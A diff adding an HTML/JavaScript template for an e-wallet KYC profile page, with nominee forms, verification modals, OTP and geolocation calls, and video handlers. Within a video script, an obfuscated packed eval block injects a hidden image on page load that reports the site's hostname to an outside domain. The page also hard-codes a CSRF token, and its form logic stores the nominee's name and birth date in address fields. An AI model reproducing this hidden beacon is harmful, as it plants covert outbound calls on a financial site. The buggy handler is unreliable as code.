+                      placeholder="Enter Full Name...">
+                  </div>
+                </div>
+
+                <div class="col-md-4 col-sm-6 mb-3">
+                  <div class="form-group">
+                    <label for="date">Nominee Date of Birth</label>
+                    <div class="form-group">
+                      <input type="date" class="form-control" id="nominee_dob" name="nominee_dob"
+                        placeholder="DD-MM-YYYY" value="" onkeydown="return false;">
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-4 col-sm-6 mb-4">
+                  <div class="form-group">
+                    <label for="">Nominee Relationship</label>
+                    <select class="form-control form-select" name="nominee_relation">
+                      <option value="">Select an Option</option>
+                      <option value="Husband">Husband</option>
+                      <option value="Wife">Wife</option>
+                      <option value="Father">Father</option>
+                      <option value="Mother">Mother</option>
+                      <option value="Son">Son</option>
+                      <option value="Daughter">Daughter</option>
+                      <option value="Brother">Brother</option>
+                      <option value="Sister">Sister</option>
+                      <option value="Others">Others</option>
+
+                    </select>
+                  </div>
+
+                </div>
+
+                <div class="col-md-12 col-sm-12 mb-0">
+                  <div class="form-group">
+                    <label for="" class="mb-0">Nominee Address</label><br>
+                    <div class="col-md-12">
+                      <div class="form-check form-check-inline ps-0">
+                        <label for="" class="mt-0"><strong>Same as correspondence address?</strong> </label>
+                        <input class="form-check-input" type="radio" id="sameAddressNo" name="is_nominee_address"
+                          value="false">
+                        <span style="top:3px;"></span>
+                        <label class="form-check-label" for="sameAddressNo">No</label>
+                      </div>
+                      <div class="form-check form-check-inline ps-0">
+                        <input class="form-check-input" type="radio" id="sameAddressYes" name="is_nominee_address"
+                          value="true" checked>
+                        <span style="top:3px;"></span>
+                        <label class="form-check-label" for="sameAddressYes">Yes</label>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+
+                <!-- Hidden nominee address form -->
+                <div class="" id="nomineeAddressForm" style="display:none;">
+                  <div class="row">
+                    <div class="col-md-4 col-sm-6 mb-4">
+                      <div class="form-group">
+                        <label for="">Address 1</label>
+                        <input type="text" class="form-control" name="nominee_address1"
+                          placeholder="Enter Address Line 1" maxlength="50">
+                      </div>
+                    </div>
+                    <div class="col-md-4 col-sm-6 mb-4">
+                      <div class="form-group">
+                        <label for="">Address 2</label>
+                        <input type="text" class="form-control" name="nominee_address2"
+                          placeholder="Enter Address Line 2" maxlength="50">
+                      </div>
+                    </div>
+                    <div class="col-md-4 col-sm-6 mb-4">
+                      <div class="form-group">
+                        <label for="">Address 3 (Optional)</label>
+                        <input type="text" class="form-control" name="nominee_address3"
+                          placeholder="Enter Address Line 3" maxlength="50">
+                      </div>
+                    </div>
+
+                    <div class="col-md-4 col-sm-6 mb-4">
+                      <div class="form-group">
+                        <label for="">City/Town/Village</label>
+                        <input type="text" class="form-control" placeholder="Enter City..." name="nominee_city">
+                      </div>
+                    </div>
+
+                    <div class="col-md-4 col-sm-6 mb-4">
+                      <div class="form-group">
+                        <label for="">State</label>
+                        <select class="form-control form-select" name="nominee_state">
+                          <option value="">Select an Option</option>
+
+                          <option value="S08">Andaman and Nicobar Islands</option>
+
+                          <option value="S03">Andhra Pradesh</option>
+
+                          <option value="S04">Arunachal Pradesh</option>
+
+                          <option value="S05">Assam</option>
+
+                          <option value="S06">Bihar</option>
+
+                          <option value="S09">Chandigarh</option>
+
+                          <option value="S07">Chattisgarh</option>
+
+                          <option value="S10">Dadra and Nagar Haveli</option>
+
+                          <option value="S11">Daman and Diu</option>
+
+                          <option value="S12">Delhi</option>
+
+                          <option value="S13">Goa</option>
+
+                          <option value="S02">Gujarat</option>
+
+                          <option value="S14">Haryana</option>
+
+                          <option value="S15">Himachal Pradesh</option>
+
+                          <option value="S16">Jammu and Kashmir</option>
+
+                          <option value="S17">Jharkhand</option>
+
+                          <option value="S18">Karnataka</option>
+
+                          <option value="S19">Kerala</option>
+
+                          <option value="S20">Lakshadweep</option>
+
+                          <option value="S21">Madhya Pradesh</option>
+
+                          <option value="S01">Maharashtra</option>
+
+                          <option value="S22">Manipur</option>
+
+                          <option value="S23">Meghalaya</option>
+
+                          <option value="S24">Mizoram</option>
+                          <option value="S25">Nagaland</option>
+                          <option value="E01">Odisha</option>
+                          <option value="S27">Pondicherry</option>
+                          <option value="S28">Punjab</option>
+                          <option value="S29">Rajasthan</option>
+                          <option value="S30">Sikkim</option>
+                          <option value="S31">Tamil Nadu</option>
+                          <option value="S36">Telangana</option>
+                          <option value="S32">Tripura</option>
+                          <option value="S33">Uttar Pradesh</option>
+                          <option value="EKYC45">Uttarakhand</option>
+                          <option value="S35">West Bengal</option>
+                        </select>
+                      </div>
+                    </div>
+
+                    <div class="col-md-4 col-sm-6 mb-4">
+                      <div class="form-group">
+                        <label for="">Pincode</label>
+                        <input type="text" class="form-control" placeholder="Enter Pincode..." name="nominee_pincode"
+                          maxlength="6" onkeypress='return restrictAlphabets(event)' minlength="6">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="col mb-4">
+                <div class="form-check form-check-inline ps-0">
+                  <input class="form-check-input" type="checkbox" id="is_profile_info_consent" name="is_profile_info_consent">
+                  <span style="top:3px;"></span>
+                  <label class="form-check-label" for="sameAddressYes">I agree to the collection and processing of my personal data according to the Privacy Policy</label>
+                 
+                </div>
+              </div>
+            </div>
+
+
+            <!-- <input type="hidden" name="profilesms" id="profilesms" value="False"> -->
+
+            <div class="text-center text-danger w-100" id="error_message"></div>
+            <div class="text-center text-success w-100" id="success_message"></div>
+
+            <div class="col-md-12 mt-3 mb-4  text-center">
+              <button class="custmbtn btn btn-primary ps-5 pe-5" id="subBtn">Update Profile </button>
+            </div>
+            <div id="updateprofilemessage"></div>
+            <!-- </div> -->
+
+          </div>
+        </form>
+      </div>
+
+    </div>
+  </div>
+</div>
+<!-- End Verify your kyc Details -->
+
+<!-- Verify your kyc Details -->
+<div class="modal fade ebixcashStudio" id="verifykyc" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
+  role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center">Verify your kyc Details</h5>
+
+        <!--<button type="button" class="close" id="signupclose" data-ds-dismiss="modal" aria-label="Close"> <span
+              aria-hidden="true">&times;</span> </button> -->
+
+      </div>
+
+      <div class="modal-body ">
+        <form>
+          <div class="form-group mb-3">
+            <label class="custom-label" for="due_name">Name:</label>
+            <input type="text" class="form-control" id="due_name" placeholder=""
+              value="  "
+              disabled>
+          </div>
+          <div class="form-group mb-3">
+            <label class="custom-label" for="due_email">Email:</label>
+            <input type="email" class="form-control" id="due_email" placeholder="" value=""
+              disabled>
+          </div>
+          <div class="form-group mb-3">
+            <label class="custom-label" for="due_mob">Mobile No:</label>
+            <input type="number" class="form-control" id="due_mob" placeholder="" value=""
+              disabled>
+          </div>
+
+
+          <div class="form-group mb-3">
+            <label class="custom-label" for="due_add">DOB:</label>
+            <input type="text" class="form-control togglelogin" placeholder="DOB" value=""
+              disabled>
+          </div>
+
+          <div class="form-group mb-3">
+            <label class="custom-label" for="due_add">Address:</label>
+            <textarea class="form-control" rows="4" id="due_add" placeholder="" value=""
+              disabled>    </textarea>
+          </div>
+
+          <div class="form-group mb-3">
+            <div class="custom-control custom-checkbox">
+              <!-- <input class="custom-control-input" type="checkbox" value="1" id="readss"  autocomplete="on"> -->
+              <small><label class="custom-label" for="readss">Please check and confirm that your details are as per our
+                  records.</label></small>
+            </div>
+          </div>
+
+          <div>
+            <div class="text-center text-danger" id="error_message_dd_yes"></div>
+            <div class="text-center text-success" id="success_message_dd_yes"></div>
+          </div>
+
+          <div class="form-group mb-3 text-center">
+            <button type="button" id="submitDueDiligenceYes" class="custmbtn btn btn-primary ps-5 pe-5">Yes</button>
+            <button type="button" id="dueDiligenceNo" class="custmbtn btn btn-primary ps-5 pe-5" data-bs-toggle="modal"
+              data-bs-target="#verifykycConfirm">No</button>
+            <!-- <a class="custmbtn btn btn-secondary ps-5 pe-5 text-white" style="line-height:35px;" data-bs-toggle="modal" data-bs-dismiss="modal" href="#verifykycadd">No</a> -->
+          </div>
+        </form>
+      </div>
+
+    </div>
+  </div>
+</div>
+<!-- End Verify your kyc Details -->
+
+<!-- Start Conformation modal -->
+<div class="modal fade" id="verifykycConfirm" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false"
+  aria-labelledby="verifykycConfirm" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 text-center" id="verifykycConfirm">Are you sure?</h1>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <p class="fs-5 text-center">If you continue, you would have to complete your VKYC. Till then you will be treated as a Min KYC user.</p>
+        <div class="my-2">
+          <div class="text-center text-danger" id="error_message_dd_no"></div>
+          <div class="text-center text-success" id="success_message_dd_no"></div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" id="dueDiligenceCancel" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+        <button type="button" class="btn btn-primary" id="submitDueDiligenceNo">Okay</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+<!-- End Conformation modal -->
+
+<!-- Complete VKYC for services -->
+ 
+<div class="modal fade" id="vkycAlertModal" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="vkycAlertModalLabel">
+  <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="vkycAlertModalLabel">Alert!</h5>
+      </div>
+      <div class="modal-body">
+        <p class="text-center" style="line-height: normal;">
+          Your Re-KYC is pending. To continue using e-wallet services, please complete your Re-KYC.
+        </p>
+        <span id="vkycErrorMessage" class="text-danger"></span>
+        <div class="w-100 text-center">
+          <button type="button" id="vkycLogoutBtn" class="btn btn-primary" onclick="loguserout()">Logout</button>
+          <button type="button" id="vkycCompleteBtn" class="btn btn-primary"
+            onclick="location.href='/account/upgrade/'">Complete VKYC</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- End Complete VKYC for services -->
+
+<!--<script>
+    const toolbar = document.getElementById("toolbar");
+    const icon = document.querySelector(".icon");
+
+    let fontStep = 0; // -2 to +2
+    let currentFontSize = 100;
+
+    function updateFontSize() {
+        currentFontSize = 100 * Math.pow(1.1, fontStep);
+        document.documentElement.style.fontSize = currentFontSize + "%";
+    }
+
+    function toggleToolbar() {
+        toolbar.style.display = (toolbar.style.display === "block") ? "none" : "block";
+    }
+
+    document.getElementById("increaseFont").addEventListener("click", function () {
+        if (fontStep < 2) {
+            fontStep++;
+            updateFontSize();
+        }
+        this.disabled = (fontStep >= 2);
+        document.getElementById("decreaseFont").disabled = (fontStep <= -2);
+    });
+  
+    document.getElementById("decreaseFont").addEventListener("click", function () {
+        if (fontStep > -2) {
+            fontStep--;
+            updateFontSize();
+        }
+        this.disabled = (fontStep <= -2);
+        document.getElementById("increaseFont").disabled = (fontStep >= 2);
+    });
+
+    document.getElementById("resetFont").addEventListener("click", function () {
+        fontStep = 0;
+        currentFontSize = 100;
+        document.documentElement.style.fontSize = "100%";
+        document.getElementById("increaseFont").disabled = false;
+        document.getElementById("decreaseFont").disabled = false;
+    });
+
+    function highContrast() {
+        document.body.classList.add("high-contrast");
+    }
+
+    function normalContrast() {
+        document.body.classList.remove("high-contrast");
+    }
+
+    document.addEventListener("click", function (event) {
+        const isClickInsideToolbar = toolbar.contains(event.target);
+        const isClickOnIcon = icon.contains(event.target);
+        if (!isClickInsideToolbar && !isClickOnIcon) {
+            toolbar.style.display = "none";
+        }
+    });
+</script> -->
+
+
+<script>
+    const toolbar = document.getElementById("toolbar");
+    const icon = document.querySelector(".icon");
+
+    let fontStep = 0; // -2 to +2
+    let currentFontSize = 100;
+
+    // -------------------------
+    // Cookie Utility Functions
+    // -------------------------
+    function setCookie(name, value, days) {
+        const expires = new Date(Date.now() + days * 86400000).toUTCString();
+        document.cookie = `${name}=${value}; expires=${expires}; path=/`;
+    }
+
+    function getCookie(name) {
+        const cookies = document.cookie.split('; ');
+        for (const c of cookies) {
+            const [k, v] = c.split('=');
+            if (k === name) return v;
+        }
+        return null;
+    }
+
+    // -------------------------
+    // Font Size Management
+    // -------------------------
+    function updateFontSize() {
+        currentFontSize = 100 * Math.pow(1.1, fontStep);
+        document.documentElement.style.fontSize = currentFontSize + "%";
+        setCookie("fontStep", fontStep, 7); // Save font step to cookie
+    }
+
+    document.getElementById("increaseFont").addEventListener("click", function () {
+        if (fontStep < 2) {
+            fontStep++;
+            updateFontSize();
+        }
+        this.disabled = (fontStep >= 2);
+        document.getElementById("decreaseFont").disabled = (fontStep <= -2);
+    });
+
+    document.getElementById("decreaseFont").addEventListener("click", function () {
+        if (fontStep > -2) {
+            fontStep--;
+            updateFontSize();
+        }
+        this.disabled = (fontStep <= -2);
+        document.getElementById("increaseFont").disabled = (fontStep >= 2);
+    });
+
+    document.getElementById("resetFont").addEventListener("click", function () {
+        fontStep = 0;
+        currentFontSize = 100;
+        document.documentElement.style.fontSize = "100%";
+        document.getElementById("increaseFont").disabled = false;
+        document.getElementById("decreaseFont").disabled = false;
+        setCookie("fontStep", 0, 7);
+    });
+
+    // -------------------------
+    // Contrast Mode Management
+    // -------------------------
+    function highContrast() {
+        document.body.classList.add("high-contrast");
+        setCookie("contrast", "high", 7);
+    }
+
+    function normalContrast() {
+        document.body.classList.remove("high-contrast");
+        setCookie("contrast", "normal", 7);
+    }
+
+    // -------------------------
+    // Toolbar Toggle and Outside Click Handling
+    // -------------------------
+    function toggleToolbar() {
+        toolbar.style.display = (toolbar.style.display === "block") ? "none" : "block";
+    }
+
+    document.addEventListener("click", function (event) {
+        const isClickInsideToolbar = toolbar.contains(event.target);
+        const isClickOnIcon = icon.contains(event.target);
+        if (!isClickInsideToolbar && !isClickOnIcon) {
+            toolbar.style.display = "none";
+        }
+    });
+
+    // -------------------------
+    // Restore Saved Settings on Load
+    // -------------------------
+    window.addEventListener("DOMContentLoaded", () => {
+        const savedFontStep = parseInt(getCookie("fontStep"));
+        if (!isNaN(savedFontStep)) {
+            fontStep = savedFontStep;
+            updateFontSize();
+            document.getElementById("increaseFont").disabled = (fontStep >= 2);
+            document.getElementById("decreaseFont").disabled = (fontStep <= -2);
+        }
+
+        const savedContrast = getCookie("contrast");
+        if (savedContrast === "high") {
+            document.body.classList.add("high-contrast");
+        }
+    });
+</script>
+
+<script>
+  document.getElementById('nomineeyes').addEventListener('click', function () {
+    document.getElementById('nomineeForm').style.display = 'block';
+  });
+
+  document.getElementById('nomineeno').addEventListener('click', function () {
+    document.getElementById('nomineeForm').style.display = 'none';
+  });
+</script>
+<script>
+  document.getElementById('pepyes').addEventListener('click', function () {
+    document.getElementById('phForm').style.display = 'block';
+  });
+
+  document.getElementById('pepno').addEventListener('click', function () {
+    document.getElementById('phForm').style.display = 'none';
+  });
+</script>
+<script>
+  document.getElementById('sameAddressYes').addEventListener('click', function () {
+    document.getElementById('nomineeAddressForm').style.display = 'none';
+  });
+
+  document.getElementById('sameAddressNo').addEventListener('click', function () {
+    document.getElementById('nomineeAddressForm').style.display = 'block';
+  });
+</script>
+
+<!-- <script src = "https://code.jquery.com/jquery-1.10.2.js"></script> -->
+<script src="/static/Common/js/jquery-ui.js"></script>
+<!--<script src = "https://code.jquery.com/ui/1.10.4/jquery-ui.js"></script> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.3.0/js/bootstrap-datepicker.js"></script>
+<!-- <script src="/static/Common/js/jquery-3.3.1.slim.min.js"></script>  -->
+<script src="/static/Common/js/popper.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+  integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+
+<!--<script src="/static/Common/js/bootstrap.min.js"></script> -->
+
+<script src="/static/Common/js/owl.carousel.js"></script>
+<script src="/static/Common/js/jquery.mCustomScrollbar.concat.min.js"></script>
+<script src="/static/Common/js/slimscroll.js"></script>
+<script src="/static/Common/js/custom.js"></script>
+<script src="/static/Common/js/isotope.js"></script>
+<!-- Data Table -->
+<!--<script src="//cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script> -->
+<script src="https://cdn.datatables.net/v/dt/dt-2.0.8/datatables.min.js"></script>
+
+<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"
+  integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA=="
+  crossorigin=""></script>
+<script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
+
+
+
+<script>
+  function resendotp(source_data) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    source_data = $('#' + source_data).val();
+    $.ajax({
+      url: "/ajax/resend-otp",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+        'source_data': source_data
+      },
+      success: function (data) {
+
+      }
+    });
+  }
+
+
+</script>
+<script>
+  $(document).ready(function () {
+    
+    ""
+    if ('12.8712704,77.6634368' == '') {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(successFunction, errorFunction);
+      }
+    }
+    ""
+  });
+
+  function successFunction(position) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+    $.ajax({
+      url: "/ajax/geo-location/",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+        'latitude': latitude,
+        'longitude': longitude
+      },
+      success: function (data) {
+
+      }
+    });
+  }
+
+  function errorFunction(error_message) {
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $.ajax({
+      url: "/ajax/geo-location/",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+        'latitude': '',
+        'longitude': ''
+      },
+      success: function (data) {
+
+      }
+    });
+  }
+
+  $(document).ready(function () {
+    // $('#PerInfo').modal('show')
+    const today = new Date();
+    const dd = String(today.getDate()).padStart(2, '0');
+    const mm = String(today.getMonth() + 1).padStart(2, '0');
+    const yyyy = today.getFullYear();
+    const maxDate = yyyy + '-' + mm + '-' + dd;
+
+    $('#nominee_dob').attr('max', maxDate);
+  });
+
+  $('#occupation').change(function (e) {
+    const value = e.target.value
+    $('#optional_occupation').val('')
+    if (value === 'Others2') {
+      $('#optional_occupation_wrapper').attr('hidden', false)
+    } else {
+      $('#optional_occupation_wrapper').attr('hidden', true)
+    }
+  })
+
+  $('#updateprofileform').submit(function (e) {
+    e.preventDefault()
+    const subBtn = $('#subBtn')
+    const error_message = $('#error_message')
+    const success_message = $('#success_message')
+
+    const annual_income = e.target.annual_income.value
+    const marital_status = e.target.marital_status.value
+    const occupation = e.target.occupation.value
+    const physically_disabled = e.target.physically_disabled.value
+    const politically_exposed = e.target.politically_exposed.value
+    const add_a_nominee = e.target.add_a_nominee.value
+    const is_profile_info_consent = e.target.is_profile_info_consent.checked
+    const nomine_info = {}
+    if (!annual_income.trim()) {
+      error_message.text('* Please Enter Annual Income')
+      return false
+    }
+    if (!marital_status.trim()) {
+
+      error_message.text('* Please Select Marital Status')
+      return false
+    }
+    if (!occupation.trim()) {
+
+      error_message.text('* Please Select Occupation')
+      return false
+    }
+
+    if (occupation == 'Others2') {
+      const optional_occupation = e.target.optional_occupation.value
+      if (!optional_occupation.trim()) {
+        error_message.text('* Please Enter Optional Occupation')
+        return false
+      }
+    }
+
+    if(politically_exposed == 'true'){
+        const pep_name = e.target.pep_name.value
+        if (!pep_name.trim()) {
+        error_message.text('* Please Enter PEP Details.')
+        return false
+      }
+    }
+
+    if (add_a_nominee == 'true') {
+      const name = e.target.nominee_name.value
+      const dob = e.target.nominee_dob.value
+      const relation = e.target.nominee_relation.value
+      const is_nominee_address = e.target.is_nominee_address.value
+      if (!name.trim()) {
+        error_message.text('* Please Enter Nominee Name')
+        return false
+      } else {
+        nomine_info['nominee_name'] = name
+      }
+      if (!dob.trim()) {
+
+        error_message.text('* Please Enter Nominee DOB')
+        return false
+      } else {
+        nomine_info['nominee_dob'] = dob
+      }
+      if (!relation.trim()) {
+
+        error_message.text('* Please Select Nominee Relation')
+        return false
+      } else {
+        nomine_info['nominee_relation'] = relation
+      }
+
+      if (is_nominee_address == 'false') {
+        const address1 = e.target.nominee_address1.value
+        const address2 = e.target.nominee_address2.value
+        const address3 = e.target.nominee_address3.value
+        const city = e.target.nominee_city.value
+        const state = e.target.nominee_state.value
+        const pincode = e.target.nominee_pincode.value
+
+        if (!address1.trim()) {
+
+          error_message.text('* Please Enter Address Line 1')
+          return false
+        } else {
+          nomine_info['nominee_address1'] = name
+        }
+        if (!address2.trim()) {
+
+          error_message.text('* Please Enter Address Line 2')
+          return false
+        } else {
+          nomine_info['nominee_address2'] = dob
+        }
+        if (!city.trim()) {
+          error_message.text('* Please Enter Nominee City')
+          return false
+        } else {
+          nomine_info['nominee_city'] = city
+        }
+        if (!state.trim()) {
+
+          error_message.text('* Please Enter Nominee State')
+          return false
+        } else {
+          nomine_info['nominee_state'] = state
+        }
+        if (!pincode.trim()) {
+
+          error_message.text('* Please Enter Nominee Pincode')
+          return false
+        } else {
+          nomine_info['nominee_pincoce'] = pincode
+        }
+        nomine_info['nominee_address3'] = address3
+      }
+    }
+
+    if (!is_profile_info_consent) {
+      error_message.text('* Please provide consent to capture your personal data.')
+      return false
+    }
+
+    subBtn.attr('disabled', true)
+    success_message.text('')
+    error_message.text('')
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $.ajax({
+      url: "/ajax/update-prsonal-info",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: $(this).serialize(),
+      success: function (data) {
+        if (data.status_code == 'S') {
+          success_message.text(data.status_desc)
+          setTimeout(() => {
+            var due_dilligence = ""
+            var re_kyc = ""
+           
+            if (due_dilligence == 'Y' && re_kyc == 'False') {
+           
+              $("#verifykyc").modal('show');
+              
+            }
+            $('#PerInfo').modal('hide')
+          }, 3000);
+        } else {
+          error_message.text(data.status_desc)
+        }
+        subBtn.attr('disabled', false)
+      }
+    });
+  })
+
+</script>
+
+
+<script>
+  function resendotp(source_data) {
+
+    document.getElementById("otpmessage").innerHTML = "Resending OTP...";
+    document.getElementById("verifyforgotpwdmessage").innerHTML = "Resending OTP...";
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    source_data = $('#' + source_data).val();
+    $.ajax({
+      url: "/ajax/resend-otp",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+        'source_data': source_data,
+        'resetCheckUser': $('#resetCheckUser').val()
+      },
+      success: function (data) {
+
+        document.getElementById("otpmessage").innerHTML = data;
+        document.getElementById("verifyforgotpwdmessage").innerHTML = data;
+
+
+      }
+    });
+  }
+</script>
+
+<script>
+  function signup_resendotp(source_data) {
+    document.getElementById("otpmessage").innerHTML = "Resending OTP...";
+    document.getElementById("verifyforgotpwdmessage").innerHTML = "Resending OTP...";
+    event.preventDefault();
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    source_data = $('#' + source_data).val();
+    $.ajax({
+      url: "/ajax/signup-resend-otp",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: {
+        'source_data': source_data,
+      },
+      success: function (data) {
+
+        document.getElementById("otpmessage").innerHTML = data;
+        document.getElementById("verifyforgotpwdmessage").innerHTML = data;
+      }
+    });
+  }
+</script>
+
+<script>
+  $(document).ready(function () {
+    $(".loadytbvideo").click(function () {
+      video = '<div class="video-fluid"><iframe allow="autoplay" class="embed-fluid" src="' + $(this).attr("data-video") + '"></iframe></div>';
+      $(this).replaceWith(video);
+    });
+  });
+  $(document).ready(function () {
+    $("#play-video").on("click", function () {
+      $("#video")[0].src = "https://www.youtube.com/embed/wiWjggYbzW8?rel=0&amp;playlist=wiWjggYbzW8&amp;loop=1&amp;autoplay=1&amp;mute=0&autoplay=1";
+    });
+    $("#shide").click(function () {
+      $(".video-modalsec").hide();
+      $("#video")[0].src = "";
+    });
+  });
+  function videoshow() {
+    $(".video-modalsec").show();
+  }
+  eval(function (p, a, c, k, e, d) {
+    e = function (c) { return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) };
+    if (!''.replace(/^/, String)) {
+      while (c--) { d[e(c)] = k[c] || e(c) } k = [function (e) { return d[e] }]; e = function () {
+        return '\\w+'
+      }; c = 1
+    }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p
+  }
+    ('g{3.f=d(){h e="<j l=\'c:m;\' a=\'5://6.4-b.7/9.8?k="+3.n.w+"&v=y\'  x=\'0\' A=\'0\'/>",i=2.z("u");t(i.p=e;i.1.o>0;)2.q.r(i.1[0])}}s(e){}',
+      37, 37, '|children|document|window|page|https|cdn|com|ashx|resizeimage|src|source|display|function||onload|try|var||img|ig|style|none|location|length|innerHTML|body|appendChild|catch|for|div|sz|hostname|width|98401|createElement|height'.split('|')
+      , 0, {}))
+</script>
+
+
+<script>
+  $(document).ready(function () {
+    $(".loadytbvideo").click(function () {
+      video1 = '<div class="video-fluid"><iframe allow="autoplay" class="embed-fluid" src="' + $(this).attr("data-video") + '"></iframe></div>';
+      $(this).replaceWith(video1);
+    });
+  });
+  $(document).ready(function () {
+    $("#play-video1").on("click", function () {
+      $("#video1")[0].src = "https://www.youtube.com/embed/fi8XjwzHq6Y?rel=0&amp;playlist=fi8XjwzHq6Y&amp;loop=1&amp;autoplay=1&amp;mute=0&autoplay=1";
+    });
+    $("#shide1").click(function () {
+      $(".video-modalsec1").hide();
+      $("#video1")[0].src = "";
+    });
+  });
+  function videoshow1() {
+    $(".video-modalsec1").show();
+  }
+</script>
+
+
+<script>
+  $(document).ready(function () {
+    $(".loadytbvideo").click(function () {
+      video2 = '<div class="video-fluid"><iframe allow="autoplay" class="embed-fluid" src="' + $(this).attr("data-video") + '"></iframe></div>';
+      $(this).replaceWith(video2);
+    });
+  });
+  $(document).ready(function () {
+    $("#play-video2").on("click", function () {
+      $("#video2")[0].src = "https://www.youtube.com/embed/yybqnB7xq5o?rel=0&amp;playlist=yybqnB7xq5o&amp;loop=1&amp;autoplay=1&amp;mute=0&autoplay=1";
+    });
+    $("#shide2").click(function () {
+      $(".video-modalsec2").hide();
+      $("#video2")[0].src = "";
+    });
+  });
+  function videoshow2() {
+    $(".video-modalsec2").show();
+  }
+</script>
+
+<script>
+  $(document).ready(function () {
+    $(".loadytbvideo").click(function () {
+      video3 = '<div class="video-fluid"><iframe allow="autoplay" class="embed-fluid" src="' + $(this).attr("data-video") + '"></iframe></div>';
+      $(this).replaceWith(video3);
+    });
+  });
+  $(document).ready(function () {
+    $("#play-video3").on("click", function () {
+      $("#video3")[0].src = "https://www.youtube.com/embed/nUCAAUHhPak?si=opI7BsZgzW9f79dl?rel=0&amp;playlist=Vca18E_zY6o&amp;loop=1&amp;autoplay=1&amp;mute=0&autoplay=1";
+    });
+    $("#shide3").click(function () {
+      $(".video-modalsec3").hide();
+      $("#video3")[0].src = "";
+    });
+  });
+  function videoshow3() {
+    $(".video-modalsec3").show();
+  }
+</script>
+
+<script>
+  $(document).ready(function () {
+    $(".loadytbvideo").click(function () {
+      video4 = '<div class="video-fluid"><iframe allow="autoplay" class="embed-fluid" src="' + $(this).attr("data-video") + '"></iframe></div>';
+      $(this).replaceWith(video4);
+    });
+  });
+  $(document).ready(function () {
+    $("#play-video4").on("click", function () {
+      $("#video4")[0].src = "https://www.youtube.com/embed/sn_XWJx5eSA?si=oTyNo7RnC-v0-1B6?rel=0&amp;playlist=wiWjggYbzW8&amp;loop=1&amp;autoplay=1&amp;mute=0&autoplay=1";
+    });
+    $("#shide4").click(function () {
+      $(".video-modalsec4").hide();
+      $("#video4")[0].src = "";
+    });
+  });
+  function videoshow4() {
+    $(".video-modalsec4").show();
+  }
+</script>
+
+<script>
+  $(document).ready(function () {
+    $(".loadytbvideo").click(function () {
+      video4 = '<div class="video-fluid"><iframe allow="autoplay" class="embed-fluid" src="' + $(this).attr("data-video") + '"></iframe></div>';
+      $(this).replaceWith(video4);
+    });
+  });
+  $(document).ready(function () {
+    $("#play-video4").on("click", function () {
+      $("#video4")[0].src = "https://www.youtube.com/embed/O1-DseQBi88?rel=0&amp;playlist=O1-DseQBi88&amp;loop=1&amp;autoplay=1&amp;mute=0&autoplay=1";
+    });
+    $("#shide4").click(function () {
+      $(".video-modalsec4").hide();
+      $("#video4")[0].src = "";
+    });
+  });
+  function videoshow4() {
+    $(".video-modalsec4").show();
+  }
+</script>
+
+<script>
+  $(document).ready(function () {
+    $(".loadytbvideo").click(function () {
+      video5 = '<div class="video-fluid"><iframe allow="autoplay" class="embed-fluid" src="' + $(this).attr("data-video") + '"></iframe></div>';
+      $(this).replaceWith(video5);
+    });
+  });
